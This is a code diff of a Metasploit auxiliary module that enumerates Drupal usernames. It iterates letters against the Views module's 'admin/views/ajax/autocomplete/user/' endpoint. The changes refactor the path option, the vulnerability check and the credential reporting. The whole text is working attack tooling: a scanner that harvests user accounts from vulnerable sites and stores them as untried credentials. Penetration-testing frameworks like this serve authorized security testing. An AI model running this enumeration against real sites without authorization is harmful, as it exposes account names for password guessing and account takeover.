@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -35,11 +35,15 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('PATH', [true, "Drupal Path", "/"])
+        OptString.new('TARGETURI', [true, "Drupal Path", "/"])
       ], self.class)
   end
 
-  def check(base_uri)
+  def base_uri
+    @base_uri ||= "#{normalize_uri(target_uri.path)}?q=admin/views/ajax/autocomplete/user/"
+  end
+
+  def check_host(ip)
     res = send_request_cgi({
       'uri'     => base_uri,
       'method'  => 'GET',
@@ -47,31 +51,45 @@ class Metasploit3 < Msf::Auxiliary
     }, 25)
 
     if not res
-      return false
+      return Exploit::CheckCode::Unknown
     elsif res and res.body =~ /\<title\>Access denied/
       # This probably means the Views Module actually isn't installed
-      print_error("#{rhost} - Access denied")
-      return false
+      vprint_error("#{rhost} - Access denied")
+      return Exploit::CheckCode::Safe
     elsif res and res.message != 'OK' or res.body != '[  ]'
-      return false
+      return Exploit::CheckCode::Safe
     else
-      return true
+      return Exploit::CheckCode::Appears
     end
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run_host(ip)
-    # Make sure the URIPATH begins with '/'
-    datastore['PATH'] = normalize_uri(datastore['PATH'])
-
-    # Make sure the URIPATH ends with /
-    if datastore['PATH'][-1,1] != '/'
-      datastore['PATH'] = datastore['PATH'] + '/'
-    end
-
-    enum_uri = datastore['PATH'] + "?q=admin/views/ajax/autocomplete/user/"
-
     # Check if remote host is available or appears vulnerable
-    if not check(enum_uri)
+    unless check_host(ip) == Exploit::CheckCode::Appears
       print_error("#{ip} does not appear to be vulnerable, will not continue")
       return
     end
@@ -83,7 +101,7 @@ class Metasploit3 < Msf::Auxiliary
       vprint_status("Iterating on letter: #{l}")
 
       res = send_request_cgi({
-        'uri'     => enum_uri+l,
+        'uri'     => base_uri+l,
         'method'  => 'GET',
         'headers' => { 'Connection' => 'Close' }
       }, 25)
@@ -109,11 +127,10 @@ class Metasploit3 < Msf::Auxiliary
     final_results.each do |user|
       print_good("Found User: #{user}")
 
-      report_auth_info(
-        :host => Rex::Socket.getaddress(datastore['RHOST']),
-        :port => datastore['RPORT'],
-        :user => user,
-        :type => "drupal_user"
+      report_cred(
+        ip: Rex::Socket.getaddress(datastore['RHOST']),
+        port: datastore['RPORT'],
+        user: user
       )
     end
 
